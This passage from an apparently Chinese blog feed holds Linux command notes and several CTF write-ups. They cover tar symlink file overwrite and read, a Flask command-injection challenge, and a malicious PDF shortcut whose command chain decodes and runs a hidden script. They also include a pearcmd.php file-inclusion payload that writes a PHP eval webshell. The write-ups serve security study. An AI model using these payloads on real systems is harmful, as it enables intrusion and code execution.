dir1/dir2/dir3</code>：创建多个目录</p><p><img src="/../images/image-20220920223042434.png" alt="image-20220920223042434"></p></li></ul><h3 id="删除目录"><a href="#删除目录" class="headerlink" title="删除目录"></a>删除目录</h3><ul><li><p><code>rmdir dir_name</code>：删除空目录</p></li><li><p><code>rm  -rf  dir_name</code>：删除非空目录</p><blockquote><p>不使用-f参数的话，需要一一确定是否删除子目录和文件</p><p>更安全，但是更麻烦</p></blockquote></li></ul><h3 id="切换到某个目录"><a href="#切换到某个目录" class="headerlink" title="切换到某个目录"></a>切换到某个目录</h3><p><code>cd dir_path</code></p><h3 id="显示当前所在目录"><a href="#显示当前所在目录" class="headerlink" title="显示当前所在目录"></a>显示当前所在目录</h3><p><code>pwd</code></p><h2 id="进程–process"><a href="#进程–process" class="headerlink" title="进程–process"></a>进程–process</h2><h3 id="查看进程"><a href="#查看进程" class="headerlink" title="查看进程"></a>查看进程</h3><ul><li>ps</li></ul><p><img src="/../images/image-20220819201116476.png" alt="image-20220819201116476"></p><p>显示了程序的进程ID（Process ID，PID），它们运行在哪个终端（TTY），以及进程已用的CPU时间。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps -ef</span><br><span class="line">ps -aux | grep apache <span class="comment"># 与grep联用查找apache进程</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-A 显示所有进程</span><br><span class="line">a 显示所有进程</span><br><span class="line">-a 显示同一终端下所有进程</span><br><span class="line">c 显示进程真实名称</span><br><span class="line">e 显示环境变量</span><br><span class="line">f 显示进程间的关系</span><br><span class="line">r 显示当前终端运行的进程</span><br><span class="line">-aux 显示所有包含其它使用的进程</span><br></pre></td></tr></table></figure><ul><li>top</li></ul><img src="../images/image-20220922144049498.png" alt="image-20220922144049498" style="zoom: 67%;" /><blockquote><p>与ps不同的点在于，ps只能显示一个时间点的进程信息，而top是实时更新，就像windows的任务管理器。</p></blockquote><p>交互命令：输入q退出top命令。</p><ul><li><p>lsof</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lsof -p pid   //查看进程打开了哪些文件</span><br></pre></td></tr></table></figure></li></ul><h3 id="结束进程"><a href="#结束进程" class="headerlink" title="结束进程"></a>结束进程</h3><blockquote><p>在Linux中，进程之间通过信号来通信。</p></blockquote><img src="../images/image-20220922144615297.png" alt="image-20220922144615297" style="zoom: 67%;" /><ul><li><p><code>kill pid</code>：通过进程的pid来结束进程</p></li><li><p><code>kill -9 pid</code>：强制结束</p></li><li><p><code>killall  process_name</code>：通过进程名结束进程（支持通配符）</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">killall http*</span><br><span class="line">上面的命令结束了所有以http开头的进程</span><br></pre></td></tr></table></figure></li></ul><h2 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h2><h3 id="切换用户"><a href="#切换用户" class="headerlink" title="切换用户"></a>切换用户</h3><p>su  -  用户名</p><p>高权限切换低权限无需密码，反之需要。</p><h3 id="查看第一次登录到系统的用户"><a href="#查看第一次登录到系统的用户" class="headerlink" title="查看第一次登录到系统的用户"></a>查看第一次登录到系统的用户</h3><p>who am i</p><h2 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h2><table><thead><tr><th align="center"></th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">#</td><td align="center">注释后面的命令</td></tr><tr><td align="center">；</td><td align="center">依次执行命令</td></tr><tr><td align="center">|</td><td align="center">管道，前一个命令的输出作为后一个命令的输入</td></tr><tr><td align="center">||</td><td align="center">如果前一条命令执行不成功则执行下一条命令</td></tr><tr><td align="center">&amp;</td><td align="center">后台执行命令</td></tr><tr><td align="center">&amp;&amp;</td><td align="center">如果前一条命令执行成功则执行下一条命令</td></tr><tr><td align="center">$?</td><td align="center">存储上一条命令的执行结果</td></tr></tbody></table><h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><h3 id="查看ip"><a href="#查看ip" class="headerlink" title="查看ip"></a>查看ip</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip address show</span><br><span class="line"></span><br><span class="line">ifconfig</span><br></pre></td></tr></table></figure><h3 id="抓取服务流量"><a href="#抓取服务流量" class="headerlink" title="抓取服务流量"></a>抓取服务流量</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo tcpdump -i lo port 6379 -w redis.pcapng</span><br></pre></td></tr></table></figure><h2 id="查找命令"><a href="#查找命令" class="headerlink" title="查找命令"></a>查找命令</h2><p><img src="/../images/image-20221007162424354.png" alt="image-20221007162424354"></p><ul><li><p><code>find</code></p><p><img src="/../images/image-20230221171347974.png" alt="image-20230221171347974"></p><p><img src="/../images/image-20230324204821642.png" alt="image-20230324204821642"></p></li><li><p><code>locate</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">更新索引数据库</span></span><br><span class="line">sudo updatedb</span><br></pre></td></tr></table></figure></li></ul><h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><blockquote><p>端口是通过端口号来标记的，端口号只有整数，范围是从0~65535 </p></blockquote><p><a href="https://www.runoob.com/w3cnote/linux-check-port-usage.html">https://www.runoob.com/w3cnote/linux-check-port-usage.html</a></p><ul><li><p>lsof</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lsof -i:8000  //查看8000端口占用情况</span><br></pre></td></tr></table></figure></li><li><p><code>netstat</code> </p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netstat -ntlp   //查看当前所有tcp端口</span><br><span class="line">netstat -ntulp | grep 80   //查看所有80端口使用情况</span><br><span class="line">netstat -ntulp | grep 3306   //查看所有3306端口使用情况</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220804194025228.png" alt="image-20220804194025228"></p></li></ul><h2 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl  command  服务</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">command</th><th align="center">mean</th></tr></thead><tbody><tr><td align="center">status</td><td align="center">查看服务状态</td></tr><tr><td align="center">start</td><td align="center">启动服务</td></tr><tr><td align="center">restart</td><td align="center">重启服务</td></tr><tr><td align="center">stop</td><td align="center">停止服务</td></tr><tr><td align="center">enable</td><td align="center">开机自启服务</td></tr><tr><td align="center">disable</td><td align="center">取消开机自启服务</td></tr></tbody></table><p>reload:不关闭unit的情况下,重新载入配置文件,让设置生效。<br>is- active:目前有没有正在运行中。<br>is- enabled:开机时有没有默认要启用这个unit。<br>kill:不要被kill这个名字吓着了,它其实是向运行unit的进程发送信号<br>show:列出unit的配置。<br>mask:禁用服务<br>unmask:取消对服务的禁用</p><p>list-unit-files|grep enable:列出所有自启动服务</p><p><img src="/../images/image-20221024194730467.png" alt="image-20221024194730467"></p><p>loaded：开机是否自启动，enabled说明是自启动的</p><p>active：现在是否启动，active（running)说明正在</p><h2 id="使用技巧"><a href="#使用技巧" class="headerlink" title="使用技巧"></a>使用技巧</h2><p><img src="/../../../../blog/source/images/image-20230221171851141-1693403138821.png" alt="image-20230221171851141"></p><p><img src="/../../../../blog/source/images/image-20230221171905266-1693403138820.png" alt="image-20230221171905266"></p><h3 id="为命令起别名"><a href="#为命令起别名" class="headerlink" title="为命令起别名"></a>为命令起别名</h3><blockquote><p><code>alias</code>命令是另一个shell的内建命令。命令别名允许你为常用的命令（及其参数）创建另一</p><p>个名称，从而将输入量减少到最低。</p></blockquote><p><code>alias 别名=&#39;原命令&#39;</code></p><p>下面为展示隐藏文件的ls命令起别名<code>la</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# alias la=&#x27;ls -a&#x27;</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# la</span><br><span class="line">.  ..  .bash_history  .bash_logout  .bash_profile  .bashrc  .cache  .cshrc  H1ve  .pip  .pki  .pydistutils.cfg  .ssh  .tcshrc  .viminfo  web</span><br></pre></td></tr></table></figure><blockquote><p>注意命令别名属于内部命令，一个别名仅在它所被定义的shell进程中才有效。</p><p>可以通过在~&#x2F;.bashrc文件内编写，已达到永久生效的效果</p></blockquote><h3 id="执行历史命令"><a href="#执行历史命令" class="headerlink" title="执行历史命令"></a>执行历史命令</h3><p>先用<code>history</code>命令查看历史命令记录，再用<code>！+ 命令编号</code>执行历史命令。</p><p><img src="/../../../../blog/source/images/image-20220923183323571-1693403159124.png" alt="image-20220923183323571"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NSSRound 6</title>
      <link href="/2023/05/31/NSSRound6/"/>
      <url>/2023/05/31/NSSRound6/</url>
      
        <content type="html"><![CDATA[<h1 id="NSSRound-6-Team-check"><a href="#NSSRound-6-Team-check" class="headerlink" title="[NSSRound#6 Team]check"></a>[NSSRound#6 Team]check</h1><h2 id="V1–任意文件上传"><a href="#V1–任意文件上传" class="headerlink" title="V1–任意文件上传"></a>V1–任意文件上传</h2><blockquote><p>服务端对上传的压缩包进行解压操作，并且没有对压缩包内容进行检查，导致可以通过符号链接达到任意覆盖&#x2F;上传文件的效果。</p></blockquote><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>假设我们要覆盖&#x2F;home&#x2F;khaz&#x2F;shell目录下的1.sh文件</p><p><img src="/../images/image-20221020234420015-1686150537835.png" alt="image-20221020234420015"></p><p>那么我们首先可以先创建一个软链接指向这个目录，并将其打包成压缩包1。</p><p><img src="/../images/image-20221020234340481-1686150537835.png" alt="image-20221020234340481"></p><p>然后我们需要再创建一个与软链接名字相同的目录，并在这个目录下创建要覆盖的文件。然后将该目录打包为压缩包2。</p><p><img src="/../images/image-20221020234743494-1686150537835.png" alt="image-20221020234743494"></p><p>然后解压压缩包1，得到test，然后解压压缩包2，其中test&#x2F;clean.sh，因为当前目录下test是指向&#x2F;home&#x2F;khaz&#x2F;shell的，所以实际上会将clean.sh解压到&#x2F;home&#x2F;khaz&#x2F;shell下从而覆盖原来的clean.sh。</p><p><img src="/../images/image-20221020234513190-1686150537835.png" alt="image-20221020234513190"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">        tar = tarfile.<span class="built_in">open</span>(file_save_path, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        tar.extractall(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>])</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/clean&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean_file</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;/tmp/clean.sh&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>做的时候，发现反弹shell不生效，在本地测试后发现是因为没有给clean.sh权限，所以覆盖后就不能执行了。</p><p><img src="/../images/Snipaste_2022-10-21_18-51-12-1686150537835.png" alt="Snipaste_2022-10-21_18-51-12"></p><p>ps：这里还有一个思路就是既然可以任意上传&#x2F;覆盖文件，那么可以直接覆盖app.py文件。</p><p>​这是因为每次修改工作目录下的文件，flask都会自动重载文件。</p><p><img src="/../images/image-20221021202646267-1686150537835.png" alt="image-20221021202646267"></p><h2 id="V2–任意文件下载"><a href="#V2–任意文件下载" class="headerlink" title="V2–任意文件下载"></a>V2–任意文件下载</h2><blockquote><p>服务端对上传的压缩包进行解压操作，并且没有对压缩包内容进行检查，并提供下载功能。导致解压出来的文件如果是符号链接文件就可以下载任意文件。</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>():</span><br><span class="line">    filename = request.form.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filepath) <span class="keyword">or</span> <span class="keyword">not</span> os.path.isfile(filepath):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/clean&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean_file</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;su ctf -c /tmp/clean.sh&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>与v1相比不同点在于<code>su ctf -c /tmp/clean.sh</code>限制了用户权限，但是flask还是以root权限启动的，所以下载功能还是root权限。</p><p>构造符号链接指向<code>/flag</code>，利用下载功能就能够读取到flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://43.142.108.3:28187/download&quot;</span></span><br><span class="line"></span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&quot;filename&quot;</span>: <span class="string">&quot;test2&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url=url,data=params).text</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NSSRound 5</title>
      <link href="/2023/05/31/NSSRound5/"/>
      <url>/2023/05/31/NSSRound5/</url>
      
        <content type="html"><![CDATA[<h1 id="NSSRound-V-Team-PYRCE"><a href="#NSSRound-V-Team-PYRCE" class="headerlink" title="[NSSRound#V Team]PYRCE"></a>[NSSRound#V Team]PYRCE</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, make_response</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag in /flag</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">rce</span>):</span><br><span class="line">    black_list = <span class="string">&#x27;01233456789un/|&#123;&#125;*!;@#\n`~\&#x27;\&quot;&gt;&lt;=+-_ &#x27;</span></span><br><span class="line">    <span class="keyword">for</span> black <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> black <span class="keyword">in</span> rce:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&quot;Ňśś&quot;</span>):</span><br><span class="line">        nss = request.args.get(<span class="string">&quot;Ňśś&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> waf(nss):</span><br><span class="line">            os.popen(nss)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;waf&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;/source&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():</span><br><span class="line">    src = <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> src</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><p>思路一，用&#x2F;flag覆盖app.py文件，再访问&#x2F;source路由</p><p>这里覆盖完了之后，还可以访问路由的原因是<code>debug=False</code>，所以即使覆盖了app.py文件，但是flask运行所使用的文件并没有受到影响。</p><p>而如果<code>debug=True</code>，当我们修改文件时，flask就会自动重载文件。</p><p>此时覆盖flask运行文件（我本地是pyrce.py）</p><p>控制台</p><p><img src="/../images/image-20221022132313611-1686150585118.png" alt="image-20221022132313611"></p><p>访问&#x2F;source路由</p><p><img src="/../images/image-20221022132349822-1686150585118.png" alt="image-20221022132349822"></p><p>思路二，利用可以访问静态文件，先创建static目录（flask框架结构，静态文件放在static目录下），再将flag复制到static目录，访问&#x2F;static&#x2F;flag就能够下载flag文件。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NewStarCTF</title>
      <link href="/2023/05/31/NewstarCTF/"/>
      <url>/2023/05/31/NewstarCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="week5"><a href="#week5" class="headerlink" title="week5"></a>week5</h2><h3 id="最后的流量分析"><a href="#最后的流量分析" class="headerlink" title="最后的流量分析"></a>最后的流量分析</h3><p>先按照数据包大小排列，看了几个包发现是sql布尔盲注（上周的sql我用的就是布尔盲注）。</p><p><img src="/../images/image-20221020130300434-1686150281425.png" alt="image-20221020130300434"></p><p>上图为正确回显</p><p>进行过滤</p><p><img src="/../images/image-20221020130340038-1686150281425.png" alt="image-20221020130340038"></p><p>一个一个找就行了</p><h3 id="奇怪的PDF-2"><a href="#奇怪的PDF-2" class="headerlink" title="奇怪的PDF 2"></a>奇怪的PDF 2</h3><p>下载下来是一个快捷方式，打开是《欺骗的艺术》这本书。😱</p><p>它是快捷方式，很自然就去看它指向了哪个文件</p><p><img src="/../images/image-20221020130709420-1686150281425.png" alt="image-20221020130709420"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">%</span><span class="language-bash">SystemRoot%\system32\cmd.exe /c copy <span class="string">&quot;strange2.pdf.lnk&quot;</span> %tmp%\\g5ZokyumBB2gDn.tmp /y</span></span><br><span class="line"></span><br><span class="line">for /r C:\\Windows\\System32\\ %i in (*ertu*.exe) do copy %i %tmp%\\msoia.exe /y</span><br><span class="line"></span><br><span class="line">findstr.exe&quot;TVNDRgAAAA&quot;%tmp%\\g5ZokyumBB2gDn.tmp&gt;%tmp%\\cSi1r0uywDNvDu.tmp&amp;%tmp%\\msoia.ex</span><br></pre></td></tr></table></figure><p>然后搜索msoia.exe就得到了类似的题</p><p><a href="https://www.anquanke.com/post/id/267031">https://www.anquanke.com/post/id/267031</a></p><p><a href="https://www.cnblogs.com/hed10ne/p/15841253.html">https://www.cnblogs.com/hed10ne/p/15841253.html</a></p><blockquote><p>目标的最大长度只有260个字符，而命令行参数的最大长度是4096个字符</p></blockquote><p>读取完整命令</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> win32com.client <span class="comment"># pip install pywin32</span></span><br><span class="line"></span><br><span class="line">shell = win32com.client.Dispatch(<span class="string">&quot;WScript.Shell&quot;</span>)</span><br><span class="line">shortcut = shell.CreateShortCut(<span class="string">&quot;20200308-sitrep-48-covid-19.pdf.lnk&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(shortcut.Targetpath)</span><br><span class="line"><span class="built_in">print</span>(shortcut.Arguments)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PS D:\python3<span class="number">.8</span>\code&gt; python -u <span class="string">&quot;d:\python3.8\code\0.py&quot;</span></span><br><span class="line">C:\Windows\System32\cmd.exe</span><br><span class="line">/c copy <span class="string">&quot;strange2.pdf.lnk&quot;</span> %tmp%\\g5ZokyumBB2gDn.tmp /y&amp;<span class="keyword">for</span> /r C:\\Windows\\System32\\ %i <span class="keyword">in</span> (*ertu*.exe) do copy %i %tmp%\\msoia.exe /y&amp;findstr.exe <span class="string">&quot;TVNDRgAAAA&quot;</span> %tmp%\\g5ZokyumBB2gDn.tmp&gt;%tmp%\\cSi1r0uywDNvDu.tmp&amp;%tmp%\\msoia.exe -decode %tmp%\\cSi1r0uywDNvDu.tmp %tmp%\\oGhPGUDC03tURV.tmp&amp;expand %tmp%\\oGhPGUDC03tURV.tmp -F:* %tmp% &amp;wscript %tmp%\\9sOXN6Ltf0afe7.js</span><br></pre></td></tr></table></figure><p><code>oGhPGUDC03tURV.tmp</code>的文件头是MSCF，是微软的.cab压缩文件格式</p><p><img src="/../images/image-20221020131408248-1686150281425.png" alt="image-20221020131408248"></p><p>使用命令<code>expand %tmp%\\oGhPGUDC03tURV.tmp -F:* 解压路径</code>得到</p><p><img src="/../images/image-20221020131537014-1686150281425.png" alt="image-20221020131537014"></p><p>flag在flag.txt中</p><p>js脚本</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> e7926b8de13327f8e703624e = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>);e7926b8de13327f8e703624e.<span class="property">Run</span> (<span class="string">&quot;cmd /c mkdir %tmp%\\flag&amp;&amp;move /Y %tmp%\\cSi1r0uywDNvDu.tmp %tmp%\\flag\\flag.txt&amp;\&quot;%tmp%\\strange2.pdf\&quot;&quot;</span>,<span class="number">0</span>);</span><br></pre></td></tr></table></figure><h3 id="Yesec-no-drumsticks-5"><a href="#Yesec-no-drumsticks-5" class="headerlink" title="Yesec no drumsticks 5"></a>Yesec no drumsticks 5</h3><h4 id="git工作原理"><a href="#git工作原理" class="headerlink" title="git工作原理"></a>git工作原理</h4><img src="E:\typora img\git-command.jpg" alt="img" style="zoom:150%;" /><ul><li>workspace：工作区–本地目录（比如我<code>git init Test</code>创建了一个空仓库，那么<code>Test</code>这个目录就是workspace）</li><li>staging area：暂存区&#x2F;缓存区–.git目录下的index文件（<code>git add</code> 或者<code>git stash</code>）</li><li>local repository：版本库或本地仓库–.git目录下的objects目录</li><li>remote repository：远程仓库–github</li></ul><p>以本题为例，其<code>.git</code>目录如下</p><p><img src="/../images/image-20221020162618015-1686150281425.png" alt="image-20221020162618015"></p><h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p><img src="/../images/image-20221020163752820-1686150281425.png" alt="image-20221020163752820"></p><p>index中有flag.txt文件</p><p>恢复缓存工作区<code>git stash pop</code></p><p><img src="/../images/image-20221020163917173-1686150281426.png" alt="image-20221020163917173"></p><p>回滚<code>git reset --hard commit_id</code>后，读取flag.txt得到<code>flag&#123;Yesec#1s#c@ibi&#125;</code></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>源码泄露</p><ol><li><p>git回滚</p><p>查看历史版本</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git log</span><br></pre></td></tr></table></figure><p>回滚到历史版本</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git reset --hard commit_id</span><br></pre></td></tr></table></figure><blockquote><p>实际上就是将HEAD指向commit_id</p></blockquote></li><li><p>git缓存</p><p>将当前工作区缓存</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git stash</span><br></pre></td></tr></table></figure><p>恢复缓存</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git stash pop</span><br></pre></td></tr></table></figure><p>回滚到缓存版本</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git reset --hard commit_id</span><br></pre></td></tr></table></figure></li></ol><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h3 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h3><h4 id="ezapi"><a href="#ezapi" class="headerlink" title="ezapi"></a>ezapi</h4><p>graphql</p><p>漏洞：<a href="https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ">https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ</a></p><p>使用语法：<a href="https://blog.csdn.net/weixin_39130261/article/details/118547853">https://blog.csdn.net/weixin_39130261/article/details/118547853</a></p><h3 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h3><h4 id="IncludeTwo"><a href="#IncludeTwo" class="headerlink" title="IncludeTwo"></a>IncludeTwo</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//Can you get shell? RCE via LFI if you get some trick,this question will be so easy!</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/base64|rot13|filter/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本地文件包含（LFI）绕过后缀名添加，使用pearcmd.php绕过。</p><p>p神的文章：<a href="https://tttang.com/archive/1312/#toc_0x06-pearcmdphp">https://tttang.com/archive/1312/#toc_0x06-pearcmdphp</a></p><blockquote><p>pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。(类似于python中的pip)在7.3及以前，pecl&#x2F;pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定<code>--with-pear</code>才会安装。</p><p>不过，在Docker任意版本镜像中，pcel&#x2F;pear都会被默认安装，安装的路径在<code>/usr/local/lib/php</code></p><p>pear中有一个命令config-create，阅读其代码和帮助，可以知道，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。</p></blockquote><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/<span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])<span class="meta">?&gt;</span>+/tmp/hello.php</span><br></pre></td></tr></table></figure><p>然后一句话木马就会被写入&#x2F;tmp&#x2F;hello.php中，我们只需包含这个文件即可。</p><h4 id="Maybe-You-Have-To-think-More"><a href="#Maybe-You-Have-To-think-More" class="headerlink" title="Maybe You Have To think More"></a>Maybe You Have To think More</h4><p>5.1.41LTS ThinkPHP框架反序列化漏洞<a href="https://www.freebuf.com/vuls/269882.html">https://www.freebuf.com/vuls/269882.html</a></p><p>这道题反序列化点在cookie中</p><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cookie:</span><br><span 